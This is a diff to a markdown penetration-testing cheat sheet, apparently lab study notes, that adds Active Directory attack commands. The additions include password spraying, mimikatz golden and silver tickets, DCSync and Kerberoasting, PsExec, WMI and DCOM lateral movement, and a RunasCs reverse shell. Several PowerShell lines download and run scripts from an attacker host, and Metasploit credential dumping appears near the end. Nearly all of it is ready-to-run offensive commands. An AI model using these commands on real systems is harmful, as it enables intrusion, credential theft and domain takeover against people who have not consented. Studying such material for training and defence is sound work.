@@ -33,13 +33,22 @@
   - [Brute Force](#brute-force)
   - [hashcrack](#hashcrack)
   - [Windows](#windows-2)
+    - [crackmap](#crackmap)
+    - [kerbrute](#kerbrute)
     - [mimikatz](#mimikatz)
+    - [AD](#ad)
 - [Lateral Movement](#lateral-movement)
   - [NTLM Relay](#ntlm-relay)
+  - [PsExec](#psexec)
+  - [WMI winRM](#wmi-winrm)
+  - [DCOM](#dcom)
+  - [RunasCs](#runascs)
 - [Discovery](#discovery)
   - [Windows](#windows-3)
     - [PowerView](#powerview)
     - [winPEAS](#winpeas)
+    - [token](#token)
+    - [BloodHound](#bloodhound)
   - [Linux](#linux-1)
     - [cmd](#cmd)
     - [linpeas](#linpeas)
@@ -47,7 +56,9 @@
   - [Windows](#windows-4)
     - [PowerUp](#powerup)
     - [LOLBIN](#lolbin)
-    - [token](#token)
+    - [token](#token-1)
+    - [Sherlock](#sherlock)
+    - [PrivescCheck](#privesccheck)
   - [Linux](#linux-2)
     - [SUGGEST](#suggest)
     - [/etc/passwd](#etcpasswd)
@@ -55,7 +66,11 @@
   - [Port Forwading](#port-forwading)
     - [SSH](#ssh)
     - [Chisel](#chisel)
+  - [SMB](#smb-1)
+  - [FTP](#ftp)
 - [Tips](#tips)
+  - [list](#list)
+  - [Metasploit](#metasploit)
 
 
 # Port Scan
@@ -321,13 +336,23 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form 
 ```
 ## hashcrack
 ```bash
-# MD5-RAW: 0, NTLM: 1000, NetNTLMv2: 5600, TGS-REP: 13100
+# MD5-RAW: 0, NTLM: 1000, NetNTLMv2: 5600, AS-REP: 18200, TGS-REP: 13100
 hashcat -m 0 -a 0 crackme.txt /usr/share/wordlists/rockyou.txt -r /usr/share/john/rules/best64.rule --force
 
 # john
 john --wordlist=/usr/share/wordlists/rockyou.txt --rules=/usr/share/john/rules/best64.rule hash.txt
 ```
 ## Windows
+### crackmap
+```bash
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+crackmapexec smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
+crackmapexec smb 10.129.144.138 -u user_list -p user_list --no-brute
+```
+### kerbrute
+```bash
+kerbrute passwordspray ./userlist Password123! -dc 10.10.10.248 -d active.htb 
+```
 ### mimikatz
 ```powershell
 # PTH
@@ -335,16 +360,84 @@ john --wordlist=/usr/share/wordlists/rockyou.txt --rules=/usr/share/john/rules/b
 .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:htb.local /ntlm:cc36cf7a8514893efccd332446158b1a" "exit"
 #PTT
 .\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
+.\mimikatz.exe "privilege::debug" "kerberos::ptt c:\ticket\folder" "exit"
+
+# silver ticket
+whoami /user
+.\mimikatz.exe "kerberos::golden /domain:htb.local /ptt /sid:S-1-5-21-1987370270-658905905-1781884369 /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:Administrator" "exit"
+
+# golden ticket
+whoami /user
+.\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /ptt /domain:htb.local /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:cc36cf7a8514893efccd332446158b1a" "exit"
 
 # lsadump
 .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam"
-.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::dcsync /user:Administrator" "exit"
+.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt /domain:htb.local" "exit"
 ```
+### AD
+#### AS-REP
+```bash
+# impacket
+impacket-GetNPUsers HTB.local/ -no-pass -dc-ip 10.10.10.161 -usersfile username.txt -format john -outputfile outhash.txt
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+
+# Rubeus
+.\Rubeus.exe asreproast /nowrap
+```
+#### Kerberoasting 
+```bash
+# impacket
+impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -save -outputfile tgs.hash
+
+# Rubeus
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+```
+#### DCsync
+```bash
+impacket-secretsdump htb.local/userattk:takSecbe987@10.10.10.161 -just-dc-user Administrator -just-dc-ntlm
+
+# SAM
+impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
+```
+
 
 # Lateral Movement
 ## NTLM Relay 
 ```bash
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c 
+```
+## PsExec
+```bash
+./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
+
+# OTH
+net use \\files04
+.\PsExec64.exe --accepteula \\PC1 cmd
+```
+## WMI winRM
+```powershell
+# winrm
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+$Options = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
+$Command = 'powershell -nop -w hidden -e';
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+
+# winrs 
+winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e "
+```
+## DCOM
+```powershell
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e   ","7")
+```
+## RunasCs
+https://github.com/antonioCoco/RunasCs
+```powershell
+.\RunasCs.exe username password cmd.exe -r 10.10.14.83:7777
 ```
 
 # Discovery
@@ -354,6 +447,14 @@ https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
 ```powershell
 cd /usr/share/windows-resources/powersploit/Recon/
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')
+
+# cmd
+Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
+Find-LocalAdminAccess
+Get-LocalGroupMember Administrators
+Invoke-UserHunter
+Get-NetSession -Verbose -ComputerName web04 
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
 ```
 ### winPEAS
 ```powershell
@@ -362,6 +463,32 @@ cd /usr/share/peass/winpeas
 iwr -Uri http:// -Outfile winPEASany.exe
 # on powershell
 iwr -Uri http:// -Outfile winPEAS.bat
+```
+
+### token
+```powershell
+Import-Module NtObjectManager
+Get-NtTokenIntegrityLevel
+```
+
+### BloodHound
+#### Sharphound
+```powershell
+# Sharphound
+cd /usr/lib/bloodhound/resources/app/Collectors/
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/Sharphound.ps1')
+Invoke-BloodHound -CollectionMethod All -Domain htb.local -DomainController 10.10.10.1 -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "Name"
+
+.\SharpHound.exe -c All -d htb.local --domainController 10.10.10.1 -o 
+
+# rusthound
+./rusthound_musl -d streamio.htb -i 10.10.11.158 -u 'JDgodd@streamIO.htb' -p 'JDg0dd1s@d0p3cr3@t0r' --ldaps
+```
+#### neo4j
+```bash
+MATCH (m:Computer) RETURN m
+MATCH (m:User) RETURN m
+MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
 ```
 
 ## Linux
@@ -426,6 +553,16 @@ cd /usr/share/windows-resources/binaries/
 .\SharpToken.exe execute "NT AUTHORITY\SYSTEM" cmd true
 .\SharpToken.exe add_user admin Abcd1234! Administrators
 ```
+### Sherlock
+https://github.com/rasta-mouse/Sherlock
+```powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/Sherlock.ps1'); Find-AllVulns
+```
+### PrivescCheck
+https://github.com/itm4n/PrivescCheck
+```powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/PrivescCheck.ps1'); Invoke-PrivescCheck
+```
 
 ## Linux
 ### SUGGEST
@@ -445,14 +582,14 @@ joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /et
 ```bash
 # localport
 ssh -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
-# l Dinamic
+# l Dynamic
 ## proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
 ssh -D 0.0.0.0:9999 database_admin@10.4.50.215
 tail /etc/proxychains4.conf
 
 # remote
 ssh -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
-# r Dinamic
+# r Dynamic
 ssh -R 9998 kali@192.168.118.4
 tail /etc/proxychains4.conf
 ```
@@ -467,11 +604,72 @@ C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:983
 ### Chisel
 ```bash
 ./chisel_1.7.5_linux_amd64 server -p 2345 --reverse
-chisel.exe client 192.168.45.157:2345 R:80:172.16.118.241:80
+chisel.exe client 192.168.45.157:2345 R:80:172.16.118.241:80 R:445:172.16.118.241:445
+
+# Dynamic
+./chisel_1.7.5_linux_amd64 server -p 2345 --socks5 --reverse
+./chisel_1.7.5_linux_amd64 client 192.168.49.100:2345 R:socks
+
+# tail /etc/proxychains4.conf
+[ProxyList]
+socks5 127.0.0.1 1080
+```
+## SMB
+```bash
+impacket-smbserver work /root/work -smb2support
+
+xcopy Win32\* \\FILE04\c$\Windows\Temp\ /s /e
+```
+
+## FTP
+```bash
+# passive mode
+passive
+
+# binary mode
+bin
+# text
+ascii
 ```
 
 
 # Tips
+## list
 ```bash
 for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
+```
+
+## Metasploit
+```bash
+# hundler
+use multi/handler
+# sessions
+sessions -l
+sessions -i 1
+
+# exploit suggest
+use post/multi/recon/local_exploit_suggester
+
+# privesc 
+getsystem
+migrate 
+
+load kiwi
+creds_all
+lsa_dump_sam
+
+# Port Forwading
+use multi/manage/autoroute
+
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set VERSION 5
+run -j
+jobs
+
+# other
+lcd /home/kali/Downloads
+lpwd
+download 
+upload
 ```
